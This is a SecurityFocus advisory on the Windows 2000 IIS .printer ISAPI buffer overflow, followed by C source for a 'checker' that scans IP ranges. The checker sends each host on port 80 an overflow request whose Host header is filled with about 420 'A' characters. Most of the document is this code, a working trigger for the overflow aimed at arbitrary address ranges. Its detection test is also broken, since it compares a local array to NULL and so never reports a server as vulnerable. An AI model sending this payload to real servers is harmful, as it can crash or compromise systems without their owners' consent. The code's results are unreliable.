source: http://www.securityfocus.com/bid/2674/info
  
Windows 2000 Internet printing ISAPI extension contains msw3prt.dll which handles user requests. Due to an unchecked buffer in msw3prt.dll, a maliciously crafted HTTP .printer request containing approx 420 bytes in the 'Host:' field will allow the execution of arbitrary code. Typically a web server would stop responding in a buffer overflow condition; however, once Windows 2000 detects an unresponsive web server it automatically performs a restart. Therefore, the administrator will be unaware of this attack.
  
* If Web-based Printing has been configured in group policy, attempts to disable or unmap the affected extension via Internet Services Manager will be overridden by the group policy settings. 

/*
   Author:  styx^

   Source:  Iis Isapi Vulnerabilities Checker v 1.0

   License: GPL
            This program is free software; you can redistribute it and/or
            modify it under the terms of the GNU General Public License
            as published by the Free Software Foundation; either version 2
            of the License, or (at your option) any later version.

   Email:   Write me for any problem or suggestion at: the.styx@gmail.com

   Date:    02/02/2005

   Read me: Just compile it with:

            Compile: gcc iivc.c -o iivc
            Use: ./iivc <initial_ip> <final_ip> [facultative(log_file)]
            Example: ./iivc 127.0.0.1 127.0.0.4 scan.log


            PAY ATTENTION: This source is coded for only personal use on
            your own iis servers. Don't hack around.

            Special thanks very much:
            To overIP (he's my master :)
            To hacklab crew (www.hacklab.tk)

   Bug:     This checker scans a range of ip and checks the iis 5.0/1
            sp1/2 .printer ISAPI extension buffer overflow
            vulnerability. If we send to a server about
            420 bytes,we can do a buffer overflow.Find for more
            specifications of this vulnerability in
            www.securityfocus.com or bugtraq. Enjoy your self! :)

            (I've been ispired (but just this :) from perl storm@stormdev.net's
            checker).

*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <time.h>

#define PORTA 80


int i = 0, j = 0, k = 0, l = 0;
int a = 0, b = 0, c = 0, d = 0;
int z = 0;
FILE *f;


int result(int );
void scan(char *);
void separe(char *, char *);
void write_file(char *);
void author();


int main(int argn, char *argv[]) {

        char initip[16], finip[16];
        struct tm *t;
        char *sep = "+-------------------------------------------------------+\n\n\n";
        time_t s, iniz, fini;

        memset(initip, 0x0, 16);
        memset(finip, 0x0, 16);


        if ( argn < 4 ) {

                author();
                printf("\n\nUse: %s <initial_ip> <final_ip> <log_file>\n", argv[0]);
                printf("\nExample.\n%s 127.0.0.1 127.0.0.4 scan.log\n\n\n", argv[0]);
                exit(0);
        }

        time(&iniz);

        if((f = fopen(argv[3], "a")) == NULL) {
                printf("Error occured when I try to open file %s\n", argv[3]);
        }

        z++;
        printf("\nNow the checker will write the result of scan in %s in your local directory..\n\n", argv[3]);
        write_file("+-------------------------------------------------------+\n| ");
        s = time(NULL);
        write_file(asctime(localtime(&s)));
        write_file("+-------------------------------------------------------+\n|\n");
        sleep(1);


        author();
        sleep(2);
        separe(argv[1],argv[2]);

        sprintf(finip,"%d.%d.%d.%d",a,b,c,d);

        while(1) {

                sprintf(initip, "%d.%d.%d.%d", i, j, k, l);
                printf("\n\n\nI'm connecting to: %s\n", initip);

                scan(initip);

                if ( strcmp(initip, finip) == 0) {
                write_file("|");
                break;
                }

                l++;

                if ( l == 256) {
                        l = 0;
                        k++;
                        if ( k == 256) {
                                k = 0;
                                j++;
                                        if (j == 256) {
                                                j = 0;
                                                i++;
                                        }
                        }
                }


        }

        time(&fini);

        printf("\n*************************\n");

        printf("\nSCAN FINISHED! in %d sec\n\n", fini - iniz);

        if( z > 0 ) {

                printf("You can view the file %s to see quietly scan's results..\n\n", argv[3]);
                fprintf(f, "\n%s\n", sep);

        }

        return 0;
        fclose(f);

}


void separe(char *ip,char *ip2) {

        char *t = '\0';
        int f = 0;

        t = strtok(ip,".");
        i = atoi(t);

        while( t != NULL) {

                t = strtok(NULL, ".");
                f++;
                if ( f == 1) j = atoi(t);
                else if (f == 2) k = atoi(t);
                else if (f == 3) l = atoi(t);

        }

        t = '\0';
        f = 0;

        t = strtok(ip2,".");
        a = atoi(t);

        while( t != NULL) {

                t = strtok(NULL, ".");
                f++;
                if ( f == 1) b = atoi(t);
                else if (f == 2) c = atoi(t);
                else if (f == 3) d = atoi(t);

                }

        return;

}


void scan(char *ip) {

        int sock, risp;
        struct sockaddr_in web;
        char buf[50];
        int i = 0;

        if( (sock = socket(AF_INET,SOCK_STREAM,0)) < 0 ) {

                printf("Error occured when I try to create socket\n");
                perror("sock:");

        }

        web.sin_family = AF_INET;
        web.sin_port = htons(PORTA);
        web.sin_addr.s_addr = inet_addr(ip);

        if( connect(sock, (struct sockaddr *)&web, sizeof(web)) < 0 ) {

                printf("I can't connect to %s..is it online?\n", ip);
                perror("connect: ");

        }

        printf("Ok..I'm sending the string...");

        risp = result(sock);

        if( risp == 0 ) {

                printf("The server %s is vulnerable...i think that you have to install a patch! :)\n\n", ip);

                if ( z > 0 ) {

                        sprintf(buf, "| The server %s is vulnerable.!\n", ip);
                        write_file(buf);

                        for( i = 0; i < 50; i++ ) {
                                buf[i] = '\0';
                        }
                }

        } else {

                printf("I'm sorry: the server %s is not vulnerable..change target\n", ip);

                if ( z > 0 ) {

                        sprintf(buf, "| I'm sorry:the server %s is not vulnerable.\n", ip);
                        write_file(buf);

                        for( i = 0; i < 50; i++ ) {
                                buf[i] = '\0';
                        }
                }
        }

        sleep(1);
        close(sock);
        return;

}


int result(int sock) {

        char *expl = "GET /NULL.printer HTTP/1.0\nHost: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n";
        char buf[1024];
        int i = 0;

        for ( i = 0; i< 1024; i++) {
                buf[i] = '\0';
        }

        if( write(sock, expl, strlen(expl)) == -1) {

                printf("Error occured when I try to send exploit...\n");
                perror("write: ");
        }

        if( read(sock, buf, sizeof(buf)) == -1) {

                printf("Error occured when I try to read from sock...\n");
                perror("read: ");

        }

        if( buf == NULL) {
                return 0;
        } else {

        return -1;

        }
}

void write_file(char *buf) {

        fprintf(f, "%s", buf);

        return;

}

void author() {

printf("\n\n\n");
printf("+--------------------------------------------+\n");
printf("|                                            |\n");
printf("|             styx^ checker for              |\n");
printf("|   IIS 5.0 sp1 sp2 ISAPI Buffer Overflows   |\n");
printf("|                                            |\n");
printf("+--------------------------------------------+\n\n");

}

